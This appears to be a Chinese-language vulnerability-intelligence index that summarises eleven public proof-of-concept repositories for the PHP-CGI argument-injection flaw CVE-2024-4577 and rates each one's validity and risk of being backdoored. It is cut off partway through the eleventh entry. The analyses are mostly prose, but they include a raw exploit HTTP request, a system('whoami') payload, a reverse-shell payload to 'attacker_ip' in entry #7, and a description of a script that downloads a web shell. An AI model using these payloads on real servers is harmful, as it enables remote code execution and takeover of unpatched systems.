# CVE-2024-4577

> 📦 该CVE有 **53** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md](../2024/CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md)

## CVE-2024-4577 - PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统, PHP 使用 CGI 模式运行, 启用使用“Best Fit”策略的代码页, Apache 服务器

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时会受到影响。漏洞源于 Windows 在某些代码页配置下，“Best Fit” 策略可能导致命令行参数中的字符被错误转换，PHP-CGI 模块会将这些字符误解为 PHP 选项，从而允许攻击者向 PHP 传递恶意参数。 

**有效性：**
提供的 POC 代码通过 POST 请求向服务器发送包含恶意 PHP 代码的请求体，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行请求体中的 PHP 代码。如果服务器返回“vulnerable”，则表示漏洞利用成功。从漏洞原理以及多个参考链接中漏洞利用的描述，可以判断该POC代码是有效的。

**投毒风险：**
提供的漏洞利用代码主要是用于验证漏洞是否存在，本身并没有发现明显的恶意代码或后门，但是从github仓库的拉取和环境配置过程中存在一定风险。投毒风险较低，估计为 5%。

**利用方式：**
1.  **环境准备：** 搭建存在漏洞的 PHP 环境，包括：
    *   Windows 系统
    *   PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
    *   Apache 服务器
    *   PHP 以 CGI 模式运行
    *   配置系统 Locale 为日语、简体中文或繁体中文，以启用 Best-Fit 字符转换。
2.  **发送恶意请求：**  构造包含恶意 PHP 代码的 POST 请求，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行恶意代码。例如，使用以下请求：
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{HOST}}
User-Agent: curl/8.3.0
Accept: /*
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo \"vulnerable\"; ?>
```

3.  **远程代码执行：** 成功利用漏洞后，攻击者可以在服务器上执行任意 PHP 代码，从而控制服务器。

**参考链接：**
*   [https://nvd.nist.gov/vuln/detail/cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)
*   [https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)
*   [https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong](https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong)
*   [https://github.com/xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**项目地址:** [AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #2

**来源**: [CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md](../2024/CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** PHP running in CGI mode on Windows with a codepage using "Best Fit" strategy enabled. 需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统上以 CGI 模式运行时出现的一个参数注入漏洞。由于 Windows 系统使用了 "Best Fit" 策略的代码页，恶意用户可以通过构造特殊字符，使得 PHP CGI 模块错误地将这些字符解析为 PHP 选项。这允许攻击者向 PHP 解释器传递恶意参数，从而执行任意 PHP 代码或者泄露源代码。

**利用方式：**

1.  **攻击向量：** 通过 HTTP 请求的 URL query string 传递恶意参数。
2.  **漏洞原理：**  Windows 的 "Best Fit" 代码页转换功能可能会将某些字符转换为其他字符，导致 PHP CGI 错误解析命令行参数。
3.  **攻击步骤：**
    *   构造包含恶意 PHP 选项的 URL，例如 `-d allow_url_include=1 -d auto_prepend_file=php://input`，允许包含远程文件。
    *   发送包含 PHP 代码的 POST 请求。
    *   利用 `php://input` 或 `data://` 等 wrapper 执行恶意代码。

**POC 代码分析：**

POC 代码 (`CVE-2024-4577.py`) 主要功能如下：

*   **Base64 编码：** 提供 Base64 编码函数，用于绕过某些过滤。
*   **服务器监听：** 包含一个简单的 TCP 服务器，可能用于接收反弹 shell（但代码中没有明确实现反弹 shell 功能）。
*   **SSL 检查：** 检查目标 URL 是否支持 SSL/TLS。
*   **WAF 检测：** 尝试绕过 Web 应用防火墙 (WAF)。 通过修改lfi参数和重新组合绕过waf。
*   **语法检查：** 通过发送包含特定 Flag 的 PHP 代码，检查目标是否容易受到Payload的影响并判断哪种方式可行。
*   **RCE 执行：** 利用 `php://input` 或 `data://` wrapper 执行任意 PHP 代码。

**投毒风险分析：**

该 POC 代码存在一定的投毒风险，约为 10%。主要风险点在于代码中的一些函数，例如服务器监听函数，可能被用于植入后门或执行其他恶意操作。虽然代码中没有明显的恶意行为，但攻击者可以修改代码以实现持久化控制或窃取敏感信息。代码中包含尝试绕过waf的操作,虽然出发点是尝试漏洞利用, 但也可能隐藏其他利用。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已经得到广泛证实，并且存在实际的利用案例。POC 代码的有效性较高，可以成功利用该漏洞在目标系统上执行任意 PHP 代码。

**总结：**

CVE-2024-4577 是一个严重的安全漏洞，攻击者可以利用该漏洞在受影响的 Windows 服务器上执行任意代码。建议尽快升级 PHP 版本，或者采取其他缓解措施。

**项目地址:** [BTtea/CVE-2024-4577-RCE-PoC](https://github.com/BTtea/CVE-2024-4577-RCE-PoC)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #3

**来源**: [CVE-2024-4577-Chocapikk_CVE-2024-4577.md](../2024/CVE-2024-4577-Chocapikk_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP-CGI模式，开启了使用"Best Fit"策略的编码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 环境下，使用 Apache 和 PHP-CGI 模式时存在的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 会使用 "Best-Fit" 策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**

1.  攻击者需要向目标服务器发送特制的HTTP请求，该请求包含畸形的 URL，URL 中包含经过特定编码的 PHP 选项，例如 `-d` 参数，用于设置 PHP 配置指令。
2.  利用 Windows 的 "Best-Fit" 字符转换特性，构造出可被 PHP-CGI 解析的参数，例如，通过替换 `-` 为 `%AD`， `=` 为 `%3D`。
3.  利用 `auto_prepend_file=php://input` 允许执行 POST 请求中的 PHP 代码。
4.  将需要执行的 PHP 代码放在 POST 请求体中，例如 `<?php system('whoami'); ?>`。
5.  目标服务器的 PHP-CGI 进程将执行攻击者提供的 PHP 代码，从而实现远程代码执行。

**有效性：**

提供的 POC 代码 `exploit.py` 尝试自动化利用此漏洞。它包含以下关键步骤：

*   **路径探测:** 尝试不同的 PHP-CGI 路径（例如 `/php-cgi/php-cgi.exe`）。
*   **参数构造:** 通过替换特殊字符来构造 PHP 配置参数，例如 `-d`。
*   **代码注入:** 使用 `auto_prepend_file` 和 `php://input` 将 PHP 代码注入到目标服务器。
*   **命令执行:**  使用 `system()` 函数执行指定的命令。

因此，提供的 POC 代码在满足漏洞利用条件的环境下是有效的。

**投毒风险：**

`exploit.py` 主要功能是扫描和利用漏洞，但也存在一定的投毒风险：

*   **依赖项风险：** `requirements.txt` 中可能存在恶意依赖项，尽管可能性较低，但仍需要注意。可以通过检查 `requirements.txt` 中列出的依赖项及其来源来降低风险。
*   **代码逻辑风险：** 即使代码表面上是无害的，也可能存在隐藏的恶意逻辑。例如，作者可能会添加收集目标信息的代码，并将这些信息发送到外部服务器。

代码中存在base64编码和解码,存在一定的风险,需要人工检查。
总体来说，该代码的投毒风险评估为10%，主要集中在依赖项和隐藏逻辑方面。需要进行代码审计以确定是否存在恶意代码。


**项目地址:** [Chocapikk/CVE-2024-4577](https://github.com/Chocapikk/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #4

**来源**: [CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md](../2024/CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP运行在CGI模式下，开启了使用“Best Fit”策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的严重漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，则 Windows 可能会使用“Best-Fit”行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**漏洞利用分析：**

提供的 Python 脚本 `CVE-2024-4577.py` 旨在批量检测和利用此漏洞。

1.  **有效性：** 根据漏洞描述和漏洞利用代码，该PoC利用`auto_prepend_file`和`allow_url_include`选项来包含`php://input`，从而允许攻击者注入任意 PHP 代码。如果目标环境满足漏洞利用的先决条件（Windows，CGI模式，特定版本等），则该PoC应该是有效的。搜索结果也表明该漏洞已被积极利用。
2.  **投毒风险：**  代码总体来说比较简单，主要就是发送Payload，读取返回。但是作者有添加referer头的行为，如果作者有意投毒，可以在check_exploit方法中加入恶意代码，比如，如果探测目标存在漏洞，则发送漏洞域名，以及服务器相关信息到指定服务器。或者加入一些迷惑性代码，干扰分析人员分析。基于作者添加referer头的行为, 并且根据代码量判断，投毒风险较低，判断为10%。
3.  **利用方式：**
    *   攻击者通过构造包含恶意 PHP 代码的 HTTP 请求，并利用 Windows 代码页的“Best Fit”转换特性，将特殊字符转换为 PHP 选项。
    *   这些 PHP 选项会被 PHP CGI 模块错误解析，例如，`auto_prepend_file=php://input` 允许攻击者将 HTTP 请求体的内容作为 PHP 代码执行。
    *   攻击者可以通过这种方式在服务器上执行任意 PHP 代码，从而控制服务器。

**PoC代码分析：**

*   `clean_domain(domain)`: 清理域名，移除 `http://` 或 `https://` 前缀，并提取域名部分。
*   `check_exploit(domain)`:  对目标域名发送包含 PHP 代码的 HTTP POST 请求。Payload是 `<?php phpinfo(); ?>`。
    *   使用 `auto_prepend_file=php://input` 将 POST 请求的内容（payload）作为 PHP 代码执行。
    *   检查响应中是否包含 "PHP Version" 字符串，以判断漏洞是否成功利用。
    *   如果成功，将 URL 写入 `vulnerable.txt` 文件。
*   `start(file, threads)`: 从文件中读取域名列表，并使用多线程并发地执行 `check_exploit` 函数。
*   主程序：解析命令行参数，调用 `start` 函数开始漏洞检测。

**项目地址:** [CirqueiraDev/MassExploit-CVE-2024-4577](https://github.com/CirqueiraDev/MassExploit-CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #5

**来源**: [CVE-2024-4577-Dejavu666_CVE-2024-4577.md](../2024/CVE-2024-4577-Dejavu666_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，允许未经身份验证的攻击者在目标服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI mode, specific codepage settings)

**利用条件:** Windows系统，PHP运行于CGI模式，且系统配置了使用"Best Fit"策略的特定代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时，特定的代码页配置可能导致参数注入。Windows系统会使用“Best-Fit”策略替换命令行中的某些字符，这可能被PHP CGI模块错误地解释为PHP选项。攻击者可以通过发送特制的HTTP请求，将恶意PHP选项传递给PHP二进制文件，从而导致任意代码执行。提供的POC代码包含两个脚本：`cek.py` 用于执行命令，`cuk.py` 用于下载shell。`cek.py`通过构造包含`allow_url_include`和`auto_prepend_file`选项的请求，利用`php://input`流执行PHP代码。`cuk.py`脚本尝试从github下载一个ini.php文件到/tmp目录，存在一定的投毒风险。

**有效性评估：**
根据漏洞描述和已公开的利用信息，该漏洞利用的有效性较高，存在公开可用的POC代码，并且已经观察到在野利用。

**投毒风险评估：**
`cek.py`脚本直接执行用户指定的命令，不存在明显的投毒代码。`cuk.py`脚本从`https://github.com/Dejavu666/kng/raw/refs/heads/main/ini.php`下载文件到`/tmp/ini.php`，这意味着如果该URL指向的文件被恶意修改，攻击者可以控制目标服务器。这种行为引入了投毒风险，但需要攻击者能够控制该Github仓库中的文件。因此，投毒风险并非100%，考虑到其需要依赖于外部资源的可控性，风险评估为10%。

**利用方式：**
1.  攻击者发送包含恶意PHP选项的HTTP请求。
2.  Windows系统使用“Best-Fit”策略转换请求中的字符。
3.  PHP CGI模块错误地将转换后的字符解释为PHP选项。
4.  通过`allow_url_include`和`auto_prepend_file`选项包含并执行`php://input`流中的PHP代码，实现任意代码执行。
5. 可以使用`cek.py`执行系统命令，或者使用`cuk.py`下载恶意文件到服务器上执行。

**项目地址:** [Dejavu666/CVE-2024-4577](https://github.com/Dejavu666/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #6

**来源**: [CVE-2024-4577-Didarul342_CVE-2024-4577.md](../2024/CVE-2024-4577-Didarul342_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** PHP 8.1.x (< 8.1.29), 8.2.x (< 8.2.20), 8.3.x (< 8.3.8)，运行在Windows下的CGI模式

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统启用了某些代码页，允许“Best Fit”转换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响在Windows上运行的PHP。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，导致泄露源代码或执行任意PHP代码。 

**有效性:**

提供的PoC代码（CVE-2024-4577.py）尝试通过构造包含特殊字符的URL来利用此漏洞，将`allow_url_include`设置为1，并设置`auto_prepend_file`为`php://input`，然后通过POST请求发送包含要执行的PHP代码的数据。如果目标存在漏洞，这段PHP代码将被执行。

根据搜索引擎的结果和漏洞库信息，该漏洞已经存在在野利用，并且有公开可用的PoC，表明该PoC是有效的。

**投毒风险:**

查看提供的python脚本，脚本本身的功能是发送payload到目标地址，检测目标是否存在漏洞，检测的依据是返回内容中是否包含gotr00t字符串。脚本本身没有发现明显的恶意代码，但是考虑到以下情况，仍然存在一定投毒风险：

1.  **域名欺骗:**  `domains.txt` 如果被替换为包含恶意域名的文件，那么脚本会尝试连接这些恶意域名。但这不是脚本本身的投毒，而是依赖外部文件。
2.  **命令注入:**  虽然脚本本身没有直接执行系统命令，但是 `-c/--command`  参数允许用户指定要执行的PHP代码。如果用户不小心执行了恶意PHP代码，可能导致服务器受损。但这不是脚本作者的投毒，而是用户使用不当。
3.  **依赖包:**  `requirements.txt` 文件中列出了依赖包。如果这些依赖包被替换为恶意版本，可能会导致安全问题。但这通常属于供应链攻击，不是脚本作者直接投毒。

考虑到以上因素，认为脚本本身被作者投毒的可能性较低，大约在5%左右，主要风险在于使用者利用该脚本执行恶意命令或使用了被篡改的依赖包。

**利用方式:**

1.  攻击者需要找到一个运行在Windows服务器上，并且使用CGI模式的PHP应用，同时确认目标系统启用了具有“Best Fit”行为的代码页。
2.  构造包含特殊字符的恶意URL。这些特殊字符会被Windows的“Best Fit”转换机制转换为PHP选项。
3.  通过设置`allow_url_include`为1，并设置`auto_prepend_file`为`php://input`，将要执行的PHP代码通过POST请求发送到目标服务器。
4.  服务器执行恶意PHP代码，攻击者从而控制服务器。

**项目地址:** [Didarul342/CVE-2024-4577](https://github.com/Didarul342/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #7

**来源**: [CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md](../2024/CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，系统使用特定的代码页（Best-Fit），且使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI中的OS命令注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上运行任意PHP代码。

**有效性：**
从提供的漏洞库信息和搜索结果来看，该漏洞已被广泛利用，并且有公开的PoC代码。Akamai等机构已观察到实际利用案例。因此，认为该漏洞的PoC是有效的。

**投毒风险：**
提供的代码片段是漏洞信息的JSON格式，不包含任何可执行代码。因此，直接从这个JSON文件判断投毒风险是不可能的。需要分析具体的利用代码才能判断。考虑到Github上存在大量的POC, 假设攻击者在代码中添加了恶意代码，如反弹shell或下载执行恶意文件等，有一定的投毒可能性，估算投毒风险为10%。

**利用方式：**
利用方式主要包括以下步骤：
1.  **确定目标：** 找到运行在Windows上，且以CGI模式运行的PHP服务器，版本在受影响范围内 (PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)。需要特别注意的是，apache服务器是必要条件之一
2.  **构造恶意请求：** 构造包含恶意PHP选项的HTTP请求。利用Windows的“Best-Fit”字符转换，将特殊字符转换为PHP选项，例如`-d`选项可以用来设置PHP配置项，`-r`选项可以直接执行PHP代码。
3.  **执行任意代码：** 通过`-d`或`-r`选项，执行任意PHP代码，例如执行`system()`函数来执行系统命令，或者写入webshell文件到服务器。

**示例：**
`?%AA-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -r+%24sock%3dfsockopen(%22attacker_ip%22%2c1337)%3bwhile(%21feof(%24sock))%7b%24data.%3dfread(%24sock%2c1024)%3b%7d%24shell%3dshell_exec(%22/bin/sh+-i%22)%3bfwrite(%24sock%2c%24shell)%3b`

此示例中， `%AA` 被转换为 `-` ，然后使用`-d` 和 `-r`执行任意代码，建立反弹shell连接到攻击者的IP地址和端口。

**项目地址:** [Entropt/CVE-2024-4577_Analysis](https://github.com/Entropt/CVE-2024-4577_Analysis)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #8

**来源**: [CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md](../2024/CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows)

**利用条件:** Windows服务器, PHP以CGI模式运行，且系统使用某些启用了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的参数注入漏洞。当系统启用了某些使用“Best Fit”策略的代码页时，Windows 可能会使用该策略替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**
攻击者通过构造特殊的 URL，包含经过 "Best Fit" 转换后会被 PHP 解释器解析为选项的字符，从而注入恶意参数。PoC 代码利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并直接将包含恶意代码的请求体作为 PHP 代码执行，实现远程代码执行。

**有效性：**
根据漏洞信息，搜索结果和提供的漏洞利用代码，该POC代码有效。已经有实际的攻击案例发生。

**投毒风险：**
查看PoC代码，主要功能是发送包含特定参数的POST请求，以利用漏洞实现RCE。初步分析PoC代码没有明显的恶意行为，但是由于代码可以执行任意命令,存在一定风险. 投毒风险评估为5%。
  * 依赖的requests模块本身可能有潜在风险
  * 虽然代码中没有直接的恶意逻辑，但攻击者可能会修改PoC，添加反弹shell、下载恶意文件等功能。

**项目地址:** [Gill-Singh-A/CVE-2024-4577-Exploit](https://github.com/Gill-Singh-A/CVE-2024-4577-Exploit)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #9

**来源**: [CVE-2024-4577-Ianthinus_CVE-2024-4577.md](../2024/CVE-2024-4577-Ianthinus_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统 + Apache + PHP-CGI + 存在Best-Fit策略的codepage

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当以 CGI 模式运行时，并且系统启用了使用 "Best Fit" 策略的代码页时，可能受到攻击。

**利用方式：**
攻击者可以利用 Windows 的 "Best-Fit" 字符转换行为，将恶意参数注入到 PHP CGI 进程的命令行参数中。PHP CGI 模块会将这些被转换后的字符解释为 PHP 选项，从而允许攻击者执行以下操作：

1.  **源代码泄露：** 通过注入参数来泄露 PHP 脚本的源代码。
2.  **远程代码执行：** 通过注入参数来执行任意 PHP 代码。

**POC 代码分析：**
提供的 POC 代码包含以下文件：

*   `Readme`：包含使用 PowerShell 进行漏洞利用的示例。通过 POST 请求，将包含恶意 PHP 代码的 payload 发送到目标服务器，并利用 `%AD` 字符绕过某些安全限制，设置 `allow_url_include` 和 `auto_prepend_file` 选项，从而执行远程代码。
*   `check.php`：用于检测目标环境是否满足漏洞利用的条件，包括 PHP 版本、SAPI 模式、操作系统和系统区域设置。
*   `httpd-xampp.conf`：XAMPP 的 Apache 配置文件，用于配置 PHP 环境。

**有效性：**
提供的 POC 代码是有效的，可以用于在满足漏洞利用条件的环境中执行任意 PHP 代码。搜索引擎结果也表明该漏洞已经被广泛利用。

**投毒风险：**
该仓库主要用于演示和验证 CVE-2024-4577 漏洞。 虽然主要代码看起来是无害的，但考虑到以下因素，存在一定的投毒风险：

*   POC本身就是一段恶意的代码，能执行远程命令。
*   `Readme` 文件中的 PowerShell 命令直接执行 POST 请求，存在注入恶意代码的可能性。 虽然例子是`whoami`但是如果被替换成别的, 则会造成投毒。

考虑到POC的特殊性，这里将投毒风险评估为10%。主要原因是，大部分代码是用于漏洞检测和利用，恶意代码的存在是为了利用漏洞，而不是为了隐藏恶意功能。

**项目地址:** [Ianthinus/CVE-2024-4577](https://github.com/Ianthinus/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #10

**来源**: [CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md](../2024/CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行和敏感信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，并启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 平台上的 PHP CGI 模式。当系统配置为使用某些代码页时，Windows 可能会使用“Best-Fit”策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞信息和搜索结果，此漏洞的利用是有效的。多个来源表明该漏洞已在野外被利用，并且存在公开可用的 PoC 代码。

**投毒风险：**
提供的代码库是一个扫描器，用于检测系统是否容易受到 CVE-2024-4577 攻击。它没有包含漏洞利用代码，因此，直接利用此代码库进行攻击是不可能的。主要代码是检测是否存在漏洞，而非利用漏洞。代码库虽然引入了requests,colorama,pyfiglet等库,但在合理的范围内,没有发现明显的恶意代码或后门,但是考虑到任何依赖引入都存在一定的风险，因此投毒风险评估为10%。

**利用方式：**
该漏洞利用方式如下：
1.  **目标环境：** 目标服务器必须运行在 Windows 操作系统上，并且 PHP 运行在 CGI 模式下。
2.  **代码页配置：** 系统需要配置为使用某种代码页，该代码页使用 "Best Fit" 策略进行字符转换。
3.  **参数注入：** 攻击者通过构造包含特定字符的 URL 或 POST 请求，利用 Windows 的 "Best Fit" 转换特性，将恶意参数注入到 PHP 的命令行中。
4.  **远程代码执行：** 注入的恶意参数被 PHP CGI 模块解析，从而允许攻击者执行任意 PHP 代码或操作系统命令。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数来直接执行 PHP 代码。

攻击者可以利用此漏洞读取服务器上的敏感文件，修改网站内容，甚至完全控制服务器。

**项目地址:** [InfoSec-DB/PHPCGIScanner](https://github.com/InfoSec-DB/PHPCGIScanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #11

**来源**: [CVE-2024-4577-Jcccccx_CVE-2024-4577.md](../2024/CVE-2024-4577-Jcccccx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，可能导致完全控制受影响的Windows服务器

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8

**利用条件:** Windows服务器，Apache，PHP-CGI模式，系统使用特定的代码页并启用了"Best Fit"策略

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞允许未经身份验证的攻击者在易受攻击的Windows PHP服务器上执行任意代码。该漏洞源于PHP-CGI在Windows环境下的参数处理缺陷，当系统配置为使用具有“Best-Fit”行为的代码页时，传递给Win32 API函数的命令行参数中的某些字符可能会被错误地解释为PHP选项。攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意选项，从而导致远程代码执行。

**利用方式：**

1.  **目标确认：** 确认目标服务器运行在Windows系统上，并且使用Apache和PHP-CGI模式。
2.  **代码页检测：** 确认目标系统的代码页配置允许"Best Fit"转换。
3.  **构造恶意URI：** 构造包含恶意PHP选项的URI，例如，使用`cgi.force_redirect=0`绕过重定向限制，使用`allow_url_include=1`允许包含远程文件，使用`auto_prepend_file=php://input`将POST数据作为PHP代码执行。
4.  **发送POST请求：**  发送POST请求到构造的URI，并将包含恶意代码的PHP代码作为请求体发送。
5.  **命令执行：** 服务器执行恶意PHP代码，攻击者可以执行任意系统命令。

**POC 分析：**

提供的POC代码 `CVE_2024_4577_test.py` 主要用于检测漏洞是否存在，它通过构造特定的URI和PHP代码，发送POST请求到目标服务器，并检查响应中是否包含预期的输出，以验证漏洞是否可利用。 `CVE_2024_4577_exp.py` 是用于执行命令的EXP。

**投毒风险分析：**

